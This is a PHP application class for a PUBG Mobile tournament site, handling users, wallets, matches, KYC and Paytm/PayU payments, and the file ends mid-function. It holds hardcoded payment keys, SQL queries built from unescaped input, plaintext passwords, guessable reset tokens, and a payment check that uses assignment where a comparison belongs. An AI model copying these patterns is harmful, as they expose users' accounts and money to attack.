<?php
  /**
   * APPLICATIONS CLASS
   * AIRDROP - A COMPLETE PUBGM TOURNAMENT MANAGEMENT SOLUTION
   * Copyright © 2019, JR Sarath - Noobs Labs
   * GNU GENERAL PUBLIC LICENSE Version 3
   */
   require __DIR__ .'/database.php';
   require '/home/gamesetter/public_html/manage/application/vendor/autoload.php';
   require '/home/gamesetter/public_html/manage/application/vendor/paytm/lib/config_paytm.php';
   require '/home/gamesetter/public_html/manage/application/vendor/paytm/lib/encdec_paytm.php';
   use PHPMailer\PHPMailer\PHPMailer;
   use PHPMailer\PHPMailer\Exception;
   use Kreait\Firebase\Factory;
   use Kreait\Firebase\ServiceAccount;
   use Kreait\Firebase\Messaging\CloudMessage;
   use Kreait\Firebase\Messaging\Notification;
   use Kreait\Firebase\Exception\Messaging\InvalidMessage;


   class App {
     public $db;
     public $dbHelper;
     public $firebase;
     public $version = "1.0";
     public $versionCode = 5;
     public $maintenance = false;
     // PAYMENT GATEWAY CONFIGS
     public $PAY_ENV_TEST = false;
     public $PAY_KEY;
     public $PAY_SALT;
     public $mailer;

     function __construct(){
       date_default_timezone_set('Asia/Kolkata');
       $database = new DB();
       $this->db = $database->connect();
       $this->dbHelper = $database;
       $this->mailer = new PHPMailer(true);
       // FIREBASE
       $serviceAccount = ServiceAccount::fromJsonFile(__DIR__.'/credentials.json');
       $this->firebase = (new Factory)
          ->withServiceAccount($serviceAccount)
          ->create();
       // PAYMENT GATEWAY CONFIG
       if ($this->PAY_ENV_TEST == true){
         $this->PAY_KEY = 'rjQUPktU';
         $this->PAY_SALT = 'e5iIg1jwi8';
       } else {
         $this->PAY_KEY = 'MfaUR5to';
         $this->PAY_SALT = '9KfDBmH40i';
       }
     }

    /**
    * INTERNAL APPLICATION FUNCTIONS
    * AIRDROP - A COMPLETE PUBGM TOURNAMENT MANAGEMENT SOLUTION
    * Copyright © 2019, JR Sarath - Noobs Labs
    * GNU GENERAL PUBLIC LICENSE Version 3
    */
      function send_notification($title,$body){
        // /topics/your_package_name
        $messaging = $this->firebase->getMessaging();
        $topic = 'matchUpdate';
        $imageUrl = 'https://manage.gamesetter.in/assets/img/icon.png';

        $message = CloudMessage::fromArray([
            'topic' => $topic,
            'notification' => [
              'title' => $title,
              'body' => $body,
              'image' => 'https://manage.gamesetter.in/assets/img/icon.png',
            ]
        ]);

        $messaging->send($message);

        try {
          $this->firebase->getMessaging()->validate($message);
          return true;
        } catch (InvalidMessage $e) {
            print_r($e->errors());
            return false;
        }
      }
      function send_channel_notification($id,$title,$body){
        // /topics/your_package_name
        $messaging = $this->firebase->getMessaging();
        $topic = $id;
        $imageUrl = 'https://manage.gamesetter.in/assets/img/icon.png';

        $message = CloudMessage::fromArray([
            'topic' => $topic,
            'notification' => [
              'title' => $title,
              'body' => $body,
              'image' => 'https://manage.gamesetter.in/assets/img/icon.png',
            ]
        ]);

        $messaging->send($message);

        try {
          $this->firebase->getMessaging()->validate($message);
        } catch (InvalidMessage $e) {
            print_r($e->errors());
        }
      }
      function list_users($type){
        if ($row = mysqli_query($this->db, "SELECT * FROM users")){
          $i = 1;
          while ($user = mysqli_fetch_assoc($row)) {
              $spend = mysqli_fetch_assoc(mysqli_query($this->db, "SELECT SUM(amount) AS amount FROM transactions WHERE user='".$user['email']."' AND status='SUCCESS' AND type='CREDIT' AND id LIKE 'WALLET-%'"));
              $amount = $spend["amount"] == null ? '00' : $spend["amount"];
              $dres = mysqli_fetch_assoc(mysqli_query($this->db, "SELECT * FROM wallet WHERE user='".$user['email']."'"));
              echo '
                  <tr>
                    <td scope="row">'.$i.'</td>
                    <td>'.$user["gamertag"].'</td>
                    <td>'.$user["email"].'</td>
                    <td>'.$user["phone"].'</td>
                    <td>'.$user["name"].'</td>
                    <td>₹'.$dres["balance"].'</td>
                    <td>₹'.$dres["bonus"].'</td>
                    <td>'.date_format(date_create($user["signup"]),"d-M-Y").'</td>
                    <td><b>₹ '.$amount.'</b></td>
                    <td class="text-right ignore">
                      <div class="dropdown">
                        <a class="btn btn-sm btn-icon-only text-light" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                          <i class="fas fa-ellipsis-v"></i>
                        </a>
                        <div class="dropdown-menu dropdown-menu-right dropdown-menu-arrow">
                          <a class="dropdown-item text-warning" href="/account-details.php?user='.$user["email"].'"><i class="fas fa-info"></i> Account Details</a>
                          <a class="dropdown-item text-primary" href="?edit-wallet='.$user["email"].'"><i class="fas fa-rupee-sign"></i> Update Wallet</a>
                          <a class="dropdown-item text-success" href="?edit-user='.$user["email"].'"><i class="fas fa-pen"></i> Update User</a>
                          <a class="dropdown-item text-danger" href="?delete='.$user["id"].'"><i class="far fa-trash-alt"></i> Delete Account</a>
                        </div>
                      </div>
                    </td>
                  </tr>
                ';
              $i++;
          }
        }
      }
      function list_kyc_requests() {
        if ($row = mysqli_query($this->db, "SELECT * FROM users WHERE doctype IS NOT NULL")){
          while ($user = mysqli_fetch_assoc($row)) {
              if ($user["docverified"] == 'true') {
                $icon = '<i class="text-success fas fa-check"></i>';
              } elseif ($user["docverified"] == 'pending'){
                $icon = '<i class="text-warning fas fa-hourglass-start"></i>';
              } else {
                $icon = '<i class="text-danger fas fa-times"></i>';
              }
              echo '
                  <tr data-status="'.strtolower($user["docverified"]).'">
                    <th scope="row">'.$user["name"].'</th>
                    <td>'.$user["email"].'</td>
                    <td>'.$user["doctype"].'</td>
                    <td>'.$icon.'<strong style="margin-left:5px">'.strtoupper($user["docverified"]).'</strong></td>
                    <td><a class="btn btn-primary text-white btn-md btn-block" href="docview.php?user='.$user["id"].'" target="_blank">View</a></td>
                    <td class="text-right">
                      <div class="dropdown">
                        <a class="btn btn-sm btn-icon-only text-light" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                          <i class="fas fa-ellipsis-v"></i>
                        </a>
                        <div class="dropdown-menu dropdown-menu-right dropdown-menu-arrow">
                          <!--a class="dropdown-item text-primary" href="#" onclick="downloadImg()"><i class="fas fa-cloud-download-alt"></i> Export Image</a-->
                          <a class="dropdown-item text-success" href="?approve='.$user["id"].'"><i class="fas fa-check"></i> Accept Request</a>
                          <a class="dropdown-item text-danger" href="?reject='.$user["id"].'"><i class="fas fa-times"></i> Reject Request</a>

                        </div>
                      </div>
                    </td>
                  </tr>
                ';
          }
        }
      }
      function list_matches($type){
        if ($row = mysqli_query($this->db, "SELECT * FROM matches")){
          while ($mt = mysqli_fetch_assoc($row)) {
                if ($mt["matchstatus"] != 'Finished') {
                  $notifBtn = '<a class="dropdown-item text-warning" href="?channel='.$mt["id"].'"><i class="far fa-bell"></i> Send Notification</a>';
                } else {
                  $notifBtn = null;
                }
                echo '
                  <tr data-status="'.strtolower($mt["matchstatus"]).'">
                    <th scope="row">'.$mt["id"].'</th>
                    <td>'.$mt["map"].'</td>
                    <td>'.$mt["matchtype"].'</td>
                    <td>'.$mt["entryfee"].'</td>
                    <td>'.$mt["winprice"].'</td>
                    <td>'.$mt["perkill"].'</td>
                    <td>'.$mt["totalplayer"].'</td>
                    <td>'.$mt["totalplayerjoined"].'</td>
                    <td>'.$mt["matchstatus"].'</td>
                    <td>'.$mt["matchschedule"].'</td>
                    <td><a class="btn btn-primary text-white btn-md btn-block" href="list-players.php?match='.$mt["id"].'">View Players</a></td>
                    <td class="text-right">
                      <div class="dropdown">
                        <a class="btn btn-sm btn-icon-only text-light" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                          <i class="fas fa-ellipsis-v"></i>
                        </a>
                        <div class="dropdown-menu dropdown-menu-right dropdown-menu-arrow">
                          <a class="dropdown-item text-primary" href="edit-match.php?match='.$mt["id"].'"><i class="fas fa-pen"></i> Edit Match</a>
                          '.$notifBtn.'
                          <a class="dropdown-item text-success" href="list-players.php?match='.$mt["id"].'"><i class="fas fa-list-ol"></i> View Players</a>
                          <a class="dropdown-item text-danger" href="?del='.$mt["id"].'"><i class="far fa-trash-alt"></i> Delete Match</a>
                        </div>
                      </div>
                    </td>
                  </tr>
                ';
            }
        }
      }
      function list_match_players($id){
        if ($res = mysqli_query($this->db, "SELECT * FROM join_match WHERE match_id='$id'")) {
          $i = 1;
          while($row = mysqli_fetch_assoc($res)){
            $winner_stat = $row["winner"] == 'true' ? '<i class="fas fa-trophy text-success" style="font-size: 25px;"></i><span style="color:#fff">True</span>' : null ;
            $user = $this->get_user($row["user"]);
            echo '
              <tr>
                <td scope="row"><b>'.$i.'</b></th>
                <td>'.$row["user"].'</td>
                <td>'.$user["gamertag"].'</td>
                <td>'.$row["kill_count"].'</td>
                <td>'.$winner_stat.'</td>
                <td>'.$user["phone"].'</td>
                <td>'.date_format(date_create($row["log_date"]),"h:i d-M-Y").'</td>
                <td class="text-right">
                  <div class="dropdown">
                    <a class="btn btn-sm btn-icon-only text-light" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                      <i class="fas fa-ellipsis-v"></i>
                    </a>
                    <div class="dropdown-menu dropdown-menu-right dropdown-menu-arrow">
                      <!--a class="dropdown-item" href="#"><i class="fas fa-key"></i> Reset Password</a-->
                      <a class="dropdown-item text-warning" href="list-players.php?match='.$id.'&credit&user='.$row["user"].'"><i class="fas fa-rupee-sign"></i> Pay User</a>
                      <a class="dropdown-item text-primary" href="list-players.php?match='.$id.'&edit-score&user='.$row["user"].'"><i class="fas fa-pen"></i> Edit Score</a>
                      <a class="dropdown-item text-success" href="list-players.php?match='.$id.'&set-winner&user='.$row["user"].'"><i class="fas fa-medal"></i> Delcare Winner</a>
                    </div>
                  </div>
                </td>
              </tr>
            ';
            $i++;
          }
        } else {
          error_log("SQL Error: ".mysqli_error($this->db));
        }
      }
      function transactions_requests(){
        if ($row = mysqli_query($this->db, "SELECT * FROM transactions ORDER BY `transactions`.`date` DESC")){
          while ($mt = mysqli_fetch_assoc($row)) {
                $date = explode(" ", $mt["date"])[0];
                $date = date_create($date);
                echo '
                  <tr class="'.$mt["status"].'">
                    <th scope="row">'.$mt["id"].'</th>
                    <td>₹ '.$mt["amount"].'</td>
                    <td>'.$mt["user"].'</td>
                    <td>'.$mt["type"].'</td>
                    <td>'.$mt["status"].'</td>
                    <td>'.date_format($date,"d M Y").'</td>
                  </tr>
                ';
            }
        }
      }
      function add_match(){
        if (mysqli_query($this->db, "INSERT INTO matches(map,type,livelink,matchtype,roomid,roompassword,banner,totalplayer,totalplayerjoined,entryfee,winprice,perkill,matchstatus,matchschedule,rule)
                                                VALUES('".$this->dbHelper->sqlSafeValue($_POST['map'])."','".$this->dbHelper->sqlSafeValue($_POST['viewMode'])."','".$this->dbHelper->sqlSafeValue($_POST['livelink'])."','".$this->dbHelper->sqlSafeValue($_POST['matchtype'])."','".$this->dbHelper->sqlSafeValue($_POST['roomid'])."','".$this->dbHelper->sqlSafeValue($_POST['roompassword'])."','".$this->dbHelper->sqlSafeValue($_POST['banner'])."','".$this->dbHelper->sqlSafeValue($_POST['totalplayer'])."','".$this->dbHelper->sqlSafeValue($_POST['totalplayerjoined'])."','".$this->dbHelper->sqlSafeValue($_POST['entryfee'])."','".$this->dbHelper->sqlSafeValue($_POST['winprice'])."','".$this->dbHelper->sqlSafeValue($_POST['perkill'])."','".$this->dbHelper->sqlSafeValue($_POST['matchstatus'])."','".$this->dbHelper->sqlSafeValue($_POST['matchdate'])." ".$this->dbHelper->sqlSafeValue($_POST['matchtime'])."','".$this->dbHelper->sqlSafeValue($_POST['rule'])."')"))
        {
          $this->send_notification('New Match Added', 'A new match has been added. Check it out now and Earn ₹'.$_POST['perkill'].'/KILL and ₹'.$_POST['winprice'].' for the Win. Entry Fee ₹'.$_POST["entryfee"].' only');
          return true;
        } else {
          error_log('SQL Error: '.mysqli_error($this->db));
          return false;
        }
      }
      function withdraw_requests(){
        if ($row = mysqli_query($this->db, "SELECT * FROM withdraw")){
          while ($mt = mysqli_fetch_assoc($row)) {
                $date = explode(" ", $mt["log_date"])[0];
                $date = date_create($date);
                echo '
                  <tr class="'.$mt["status"].'" data-status="'.strtolower($mt["status"]).'">
                    <th scope="row">'.$mt["txnid"].'</th>
                    <td>₹ '.$mt["amount"].'</td>
                    <td>'.$mt["user"].'</td>
                    <td>'.$mt["status"].'</td>
                    <td>'.$mt["gateway"].'</td>
                    <td></td>
                    <td>'.date_format($date,"d M Y").'</td>
                    <td class="text-right">
                      <div class="dropdown">
                        <a class="btn btn-sm btn-icon-only text-light" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                          <i class="fas fa-ellipsis-v"></i>
                        </a>
                        <div class="dropdown-menu dropdown-menu-right dropdown-menu-arrow">
                          <a class="dropdown-item text-success" href="?approve='.$mt["id"].'"><i class="fas fa-check"></i>Approve withdraw</a>
                          <a class="dropdown-item text-danger" href="?decline='.$mt["id"].'"><i class="fas fa-times"></i>Decline Withdraw</a>
                        </div>
                      </div>
                    </td>
                  </tr>
                ';
            }
        }
      }

    /**
    * REST API CONTROLLER FUNCTIONS
    * AIRDROP - A COMPLETE PUBGM TOURNAMENT MANAGEMENT SOLUTION
    * Copyright © 2019, JR Sarath - Noobs Labs
    * GNU GENERAL PUBLIC LICENSE Version 3
    */

      // USER API
      function login($email, $password){
        $e = $this->dbHelper->sqlSafeValue($email);
        $p = $this->dbHelper->sqlSafeValue($password);
        if ($res = mysqli_query($this->db, "SELECT * FROM users WHERE email='$e' AND password='$p'")) {
          if (mysqli_num_rows($res) == 1) {
            $row = mysqli_fetch_assoc($res);
            return $row;
          } else {
            $dres = mysqli_query($this->db, "SELECT * FROM users WHERE email='$e'");
            if (mysqli_num_rows($dres) == 0){
              return 'not-exist';
            } else {
              return 'missmatch';
            }
          }
        } else {
          error_log('SQL Error :'.mysqli_error($this->db));
          return false;
        }
      }
      function signup($email,$name,$password,$gamertag,$phone,$ref){
        $e = $this->dbHelper->sqlSafeValue($email);
        $n = $this->dbHelper->sqlSafeValue($name);
        $p = $this->dbHelper->sqlSafeValue($password);
        $g = $this->dbHelper->sqlSafeValue($gamertag);
        $ph = $this->dbHelper->sqlSafeValue($phone);
        $rc = strtoupper(uniqid());
        $d = date('Y-m-d G:i:s');
        if (mysqli_query($this->db, "INSERT INTO users(email,name,password,gamertag,phone,refercode,referrer) VALUES('$e','$n','$p','$g', '$ph', '$rc','$ref')")){
          if (mysqli_query($this->db, "INSERT INTO wallet(user,bonus,last_updated) VALUES('$e','10', '$d')")) {
            // ADD REF ENTRY
            if (!empty($ref)){
              error_log('Setting Ref');
              $user = mysqli_fetch_assoc(mysqli_query($this->db, "SELECT * FROM users WHERE refercode='$ref'"));
              mysqli_query($this->db, "INSERT INTO refer(user,referrer) VALUES('$e', '".$user['email']."')");
            }
            // SEND VERIFICATION MAIL
            $this->send_verification($email);
            return "success";
          } else {
            error_log('SQL Error :'.mysqli_error($this->db));
            return "failed";
          }
        } else {
          error_log('SQL Error :'.mysqli_error($this->db));
          if (strpos(mysqli_error($this->db), 'Duplicate entry') !== false){
            return "duplicate";
          } else {
            return "failed";
          }
        }
      }
      function send_verification($email) {
        try {
          // SEND VERIFICATION MAIL
          $this->mailer->setFrom('no-reply@gamesetter.in', 'Game Setter - Support');
          $this->mailer->addAddress($email);
          $this->mailer->addReplyTo('support@gamesetter.in');
          $this->mailer->Subject = 'Welcome to gamesetter';
          $this->mailer->isHTML(true);
          $code = base64_encode(date("h:i:s d.m.Y").'-'.base64_encode($email));
          $this->mailer->Body = '
            Hello Gamer,<br />
            Welcome to Game Setter<br />
            we are happy to have you onboard<br />
            This is the perfect time to shine and show off your gaming skills and earn some money alongside with it.<br />
            To get started please verify your Email first: <a href="https://manage.gamesetter.in/welcome.php?crc='.$code.'">https://manage.gamesetter.in/welcome.php?crc='.$code.'</a><br />
            Thank You - Game Setter
            <br><br>
            <hr>
            &copy; '.date('Y').' Allrights Reserved - Game Setter<br />
            This is an auto-generated email, Please do not reply back to this email.
            '
          ;
          $this->mailer->send();
          return true;
        } catch (Exception $e) {
          error_log("Mailer Error: ".$this->mailer->ErrorInfo);
          return false;
        }

      }
      function phone_verification($email) {
        if (mysqli_query($this->db, "UPDATE users SET pVerified='true' WHERE email='$email'")) {
          return true;
        } else {
          return false;
        }
      }
      function get_user($email){
        if ($row = mysqli_query($this->db, "SELECT * FROM users WHERE email='$email'")) {
          $user = mysqli_fetch_assoc($row);
          return $user;
        } else {
          error_log("MYSQL ERROR: ".mysqli_error($this->db));
        }
      }
      function update_user($email,$name,$gamertag,$bank,$paytm,$googlepay,$amazonpay){
        $b = serialize($bank);
        if (mysqli_query($this->db, "UPDATE users SET name='$name',gamertag='$gamertag',bank='$bank',paytm='$paytm',googlepay='$googlepay',amazonpay='$amazonpay' WHERE email='$email'")) {
          return true;
        } else {
          error_log("MYSQL ERROR: ".mysqli_error($this->db));
        }
      }
      function update_password($email, $password){
        if (mysqli_query($this->db, "UPDATE users SET password='$password' WHERE email='$email'")) {
          return true;
        } else {
          error_log("MYSQL ERROR: ".mysqli_error($this->db));
        }
      }
      function update_kyc($user,$doctype,$docfront,$docback){
        if (mysqli_query($this->db, "UPDATE users SET doctype='$doctype',docfront='$docfront',docback='$docback',docverified='pending' WHERE email='$user'")) {
          return true;
        } else {
          error_log("MYSQL ERROR: ".mysqli_error($this->db));
          return false;
        }
      }
      function reset_mail($email){
        $res = mysqli_query($this->db, "SELECT * FROM users WHERE email='$email'");
        if (mysqli_num_rows($res) == 1) {
          try {
            $user = $this->get_user($email);
            $this->mailer->setFrom('no-reply@gamesetter.in', 'Game Setter - Support');
            $this->mailer->addAddress($email);
            $this->mailer->addReplyTo('support@gamesetter.in');
            $this->mailer->Subject = 'Game Setter - Reset your password';
            $this->mailer->isHTML(true);
            $code = base64_encode(date("h:i:s d.m.Y").'-'.base64_encode($email));
            $this->mailer->Body = '
              Hello there,<br />
              Seems like you have forgot your password<br />
              Kinldy Follow this link to Reset your password<br />
              <a href="https://manage.gamesetter.in/reset.php?crc='.$code.'">https://manage.gamesetter.in/reset.php?crc='.$code.'</a><br />
              Please ignore this email if not requested a password reset<br />
              Thank You - Game Setter
              <br><br>
              <hr>
              This is an auto-generated email, Please do not reply back to this email.
              '
            ;
            $this->mailer->send();
            return true;
          } catch (Exception $e) {
            error_log("Mailer Error: ".$this->mailer->ErrorInfo);
            return false;
          }
        } else {
          error_log('SQL Error :'.mysqli_error($this->db));
          return false;
        }
      }
      function reset_password($user,$pass){
        if (mysqli_query($this->db, "UPDATE users SET password='$pass' WHERE email='$user'")){
          return true;
        } else {
          error_log('SQL Error :'.mysqli_error($this->db));
          return false;
        }
      }
      function get_user_stat($user){
        $joined = mysqli_num_rows(mysqli_query($this->db, "SELECT * FROM join_match WHERE user='$user'"));
        $wins = mysqli_num_rows(mysqli_query($this->db, "SELECT * FROM join_match WHERE user='$user' AND winner='true'"));
        $earning = mysqli_fetch_assoc(mysqli_query($this->db, "SELECT SUM(amount) as amount FROM transactions WHERE user='$user' AND id LIKE 'MPRIZE-%'"));
        $data = array(
                        'matchPlayed' => $joined,
                        'chickenDinner' => $wins,
                        'totalEarned' => $earning["amount"]
                     );

        return $data;
      }
      function get_user_refers($user) {
        $u = $this->get_user($user);
        if ($res = mysqli_query($this->db, "SELECT * FROM users WHERE referrer='".$u["refercode"]."'")) {
          $data = [];
          while($row = mysqli_fetch_assoc($res)){
            $data[] = $row;
          }
          return $data;
        } else {
          error_log("SQL Error: ".mysqli_error($this->db));
        }
      }
      // WALLET API
      // PAYTM SPECIFIC
      function generatePaymentRequest($amount, $email){
        $user = $this->get_user($email);
        $uid_email = $email;
        $uid_number = $user["phone"];
        $uid = $user["id"];
        //get hash of order id and update it
        $order_hash = 'ORDER-' . crc32($uid) . time(); //Every order id should be unique
        $checkSum = "";
        $paramList = array();
        // Create an array having all required parameters for creating checksum.
        $paramList["MID"] = $this->PAYTM_MID;
        $paramList["CHANNEL_ID"] = 'WAP';
        $paramList["INDUSTRY_TYPE_ID"] = 'Retail';
        $paramList["WEBSITE"] = 'APPSTAGING';
        $paramList["TXN_AMOUNT"] = $amount;
        $paramList["ORDER_ID"] = $order_hash;
        $paramList["EMAIL"] = $uid_email; //Email ID of customer
        $paramList["MOBILE_NO"] = $uid_number; //Mobile number of customer
        $paramList["CUST_ID"] = $uid; //unique user id
        $paramList["CALLBACK_URL"] = "https://pguat.paytm.com/paytmchecksum/paytmCallback.jsp";
        $checkSum = getChecksumFromArray($paramList,$this->PAYTM_MKEY);
        $paramList["CHECKSUM"] = $checkSum;
        // ADD TRANSACTION ENTRY
        if (mysqli_query($this->db, "INSERT INTO transactions(id, amount, user, number, status) VALUES('".$paramList['ORDER_ID']."', '".$paramList['TXN_AMOUNT']."', '".$paramList['EMAIL']."', '".$paramList['MOBILE_NO']."', 'PENDING')")) {
          null;
        } else {
          error_log("MYSQL ERROR: ".mysqli_error($this->db));
        }
        return $paramList; //this param list will be used in javascript to start paytm transaction
      }
      function verifyPaymentRequest($ORDERID, $user){
        //validate payment status with Paytm using order id
        $paramList = array();
        $paramList['MID'] = $this->PAYTM_MID;
        $paramList['ORDERID'] = $ORDERID;
        $checkSum = getChecksumFromArray($paramList,$this->PAYTM_MKEY);
        $paramList['CHECKSUMHASH'] = $checkSum;
        $url = $this->PAYTM_STATUS_QUERY_URL . '?JsonData=' .json_encode($paramList);
        $f = file_get_contents($url);
        $f = json_decode($f);
        $d = date('Y-m-d G:i:s');
        if ($f->RESPCODE = "01" && $f->TXNAMOUNT != ""){
          $res = mysqli_fetch_assoc(mysqli_query($this->db, "SELECT * FROM transactions WHERE id='$ORDERID'"));
          if ($res['status'] != 'SUCCESS'){
            if (mysqli_query($this->db, "UPDATE transactions SET status='SUCCESS' WHERE id='$ORDERID'")) {
              $amount = +$f->TXNAMOUNT;
              if ($res = mysqli_query($this->db, "UPDATE wallet SET balance=balance+$amount, last_updated='$d' WHERE user='$user'")) {
                $row = mysqli_fetch_assoc(mysqli_query($this->db, "SELECT * FROM wallet WHERE user='$user'"));
                return array('status' =>  'success', 'balance' =>  $row["balance"]);
              } else {
                error_log("MYSQL ERROR: ".mysqli_error($this->db));
              }
            } else {
              error_log("MYSQL ERROR: ".mysqli_error($this->db));
            }
          } else {
            $row = mysqli_fetch_assoc(mysqli_query($this->db, "SELECT * FROM wallet WHERE user='$user'"));
            return array('status' =>  'duplicate', 'balance' =>  $row["balance"]);
          }
        } else {
          if (mysqli_query($this->db, "UPDATE transactions SET status='FAILED' WHERE id='$ORDERID'")) {
            return array('status' =>  'failed' );
          } else {
            error_log("MYSQL ERROR: ".mysqli_error($this->db));
          }
        }

      }
      // PAY U SPECIFIC
      function generatePayUHash($amnt, $email){
        $user = $this->get_user($email);
        $uid = $user["id"];
        $amount = $amnt.".0";
        $txid = 'WALLET-'.time();
        $productId = "wallet";
        $name = $user["name"];
        $email = $email;
        $phone = $user["phone"];
        $udf1 = $data["udf1"];
        $udf2 = $data["udf2"];
        $udf3 = $data["udf3"];
        $udf4 = $data["udf4"];
        $udf5 = $data["udf5"];

        $payhash_str = $this->PAY_KEY . '|' . $this->checkNull($txid) . '|' . $this->checkNull($amount) . '|' . $this->checkNull($productId) . '|' . $this->checkNull($name) . '|' . $this->checkNull($email) . '|' . $this->checkNull($udf1) . '|' . $this->checkNull($udf2) . '|' . $this->checkNull($udf3) . '|' . $this->checkNull($udf4) . '|' . $this->checkNull($udf5) . '||||||'. $this->PAY_SALT;

        $hash = strtolower(hash('sha512', $payhash_str));
        $data = array(
                  'name' => $name,
                  'email' => $email,
                  'phone' => $phone,
                  'order_id' => $txid,
                  'amount' => $amount,
                  'cust_id' => $uid,
                  'productId' => $productId,
                  'success_url' => "https://manage.gamesetter.in/api/payment.php?action=payucallback&response=success",
                  'failed_url' => "https://manage.gamesetter.in/api/payment.php?action=payucallback&response=failed",
                  'hash' => $hash,
                  'raw' => $payhash_str
                );
        // ADD TRANSACTION ENTRY
        if (mysqli_query($this->db, "INSERT INTO transactions(id, amount, user, number, status, type) VALUES('$txid', '$amount', '$email', '$phone', 'PENDING', 'CREDIT')")) {
          null;
        } else {
          error_log("MYSQL ERROR: ".mysqli_error($this->db));
        }
        return $data;
      }
      function checkNull($value){
          if ($value == null) {
              return '';
          } else {
              return $value;
          }
      }
      function update_transaction($ORDERID, $STATUS, $AMOUNT, $user){
          $d = date('Y-m-d G:i:s');
          $res = mysqli_fetch_assoc(mysqli_query($this->db, "SELECT * FROM transactions WHERE id='$ORDERID'"));
          if ($STATUS == 'SUCCESS'){
            if (mysqli_query($this->db, "UPDATE transactions SET status='SUCCESS' WHERE id='$ORDERID'")) {
              $amount = +$AMOUNT;
              if ($res = mysqli_query($this->db, "UPDATE wallet SET balance=balance+$amount, last_updated='$d' WHERE user='$user'")) {
                error_log('Wallet: Balance Update for - '.$user);
              } else {
                error_log("MYSQL ERROR: ".mysqli_error($this->db));
              }
            } else {
              error_log("MYSQL ERROR: ".mysqli_error($this->db));
            }
          } else {
            if (mysqli_query($this->db, "UPDATE transactions SET status='FAILED' WHERE id='$ORDERID'")) {
              error_log('Wallet: Transaction failed for - '.$user);
            } else {
              error_log("MYSQL ERROR: ".mysqli_error($this->db));
            }
          }
      }
      function get_wallet($user){
        if ($res = mysqli_query($this->db, "SELECT * FROM wallet WHERE user='$user'")){
          $row = mysqli_fetch_assoc($res);
          return array('balance' => $row["balance"],'bonus' => $row['bonus']);
        } else {
          error_log("MYSQL ERROR: ".mysqli_error($this->db));
        }

      }
      function withdraw($amount, $user, $gateway){
        if ($res = mysqli_query($this->db, "SELECT * FROM wallet WHERE user='$user'")){
          $row = mysqli_fetch_assoc($res);
          if ((+$row["balance"] - 10) >= +$amount) {
            $txn = "WITHD-".time();
            if (mysqli_query($this->db, "INSERT INTO withdraw(user,amount,gateway,txnid) VALUES('$user', '$amount', '$gateway','$txn')")){
              $amnt = +$amount;
              mysqli_query($this->db, "UPDATE wallet SET balance=balance-$amnt WHERE user='$user'");
              mysqli_query($this->db, "INSERT INTO transactions(id, amount, user, number, status, type) VALUES('$txn', '$amount', '$user', 'null', 'PENDING', 'DEBIT')");
              return array('status' =>  'success', 'txnid' => $txn);
            } else {
              error_log("MYSQL ERROR: ".mysqli_error($this->db));
              return array('status' =>  'failed');
            }
          } else {
            return array('status' =>  'not-enough');
          }
        } else {
          error_log("MYSQL ERROR: ".mysqli_error($this->db));
        }
      }

      // MATCHES API
      function get_upcoming_matches(){
        if ($row = mysqli_query($this->db, "SELECT * FROM matches WHERE matchstatus='Upcoming'")) {
          $array = array();
          while ($res = mysqli_fetch_assoc($row)){
            $array[] = $res;
          }
          return $array;
        } else {
          error_log("MYSQL ERROR: ".mysqli_error($this->db));
        }
      }
      function get_ongoing_matches($id){
        if ($res = mysqli_query($this->db, "SELECT * FROM join_match WHERE user='$id'")){
          $array = array();
          while ($row = mysqli_fetch_assoc($res)){
            $match_id = $row["match_id"];
            if ($row_match = mysqli_query($this->db, "SELECT * FROM matches WHERE matchstatus='Ongoing' AND id='$match_id'")) {
              while ($res_match = mysqli_fetch_assoc($row_match)){
                $array[] = $res_match;
              }
            } else {
              error_log("MYSQL ERROR: ".mysqli_error($this->db));
            }
          }
          return $array;
        } else {
          error_log("MYSQL ERROR: ".mysqli_error($this->db));
        }
      }
      function get_finished_matches(){
        if ($row = mysqli_query($this->db, "SELECT * FROM matches WHERE matchstatus='Finished'")) {
          $array = array();
          while ($res = mysqli_fetch_assoc($row)){
            $array[] = $res;
          }
          return $array;
        } else {
          error_log("MYSQL ERROR: ".mysqli_error($this->db));
        }
      }
      function join_match($id, $user, $amnt){
        if($res = mysqli_query($this->db, "SELECT * FROM join_match WHERE user='$user' AND match_id='$id'")){
          if (mysqli_num_rows($res) == 0) {
            // CREDIT REFERRER IF FIRST MATCH JOINING
              if (mysqli_num_rows(mysqli_query($this->db, "SELECT * FROM join_match WHERE user='$user'")) == 0) {
                $userData = $this->get_user($user);
                $referrer = mysqli_fetch_assoc(mysqli_query($this->db, "SELECT email from users WHERE refercode='".$userData['referrer']."'"));
                mysqli_query($this->db, "UPDATE wallet SET bonus=bonus+10 WHERE user='".$referrer['email']."'");
                mysqli_query($this->db, "INSERT INTO transactions(id,amount,user,number,type,status) VALUES('".'REFER-'.time()."', '10', '".$referrer['email']."','null','REFER-CREDIT','SUCCESS')");
              }
            if (mysqli_query($this->db, "INSERT INTO join_match(match_id,user) VALUES('$id','$user')")) {
              $walletData = mysqli_fetch_assoc(mysqli_query($this->db, "SELECT * from wallet WHERE user='$user'"));
              mysqli_query($this->db, "UPDATE matches SET totalplayerjoined=totalplayerjoined+1 WHERE id='$id'");
              $amount = +$amnt;
              $order_id = 'MATCH-'.time();
              if ($walletData['bonus'] >= $amount) {
                mysqli_query($this->db, "UPDATE wallet SET bonus=bonus-$amount WHERE user='$user'");
              } else {
                mysqli_query($this->db, "UPDATE wallet SET balance=balance-$amount WHERE user='$user'");
              }
              mysqli_query($this->db, "INSERT INTO transactions(id,amount,user,number,type,status) VALUES('$order_id', '$amount', '$user','null','MATCH-MONEY','SUCCESS')");
              return array("status" => 'success');
            } else {
              error_log("MYSQL ERROR: ".mysqli_error($this->db));
            }
          } else {
            return array("status" => 'duplicate');
          }
        } else {
          error_log("MYSQL ERROR: ".mysqli_error($this->db));
        }
      }
      function join_status($id, $user){
        if($res = mysqli_query($this->db, "SELECT * FROM join_match WHERE user='$user' AND match_id='$id'")){
          if (mysqli_num_rows($res) > 0) {
            return array("status" => 'joined');
          } else {
            return array("status" => 'not-joined');
          }
        } else {
          error_log("MYSQL ERROR: ".mysqli_error($this->db));
        }
      }
      function get_user_transactions($user) {
        if ($row = mysqli_query($this->db, "SELECT * FROM transactions WHERE user='$user'")) {
          $array = array();
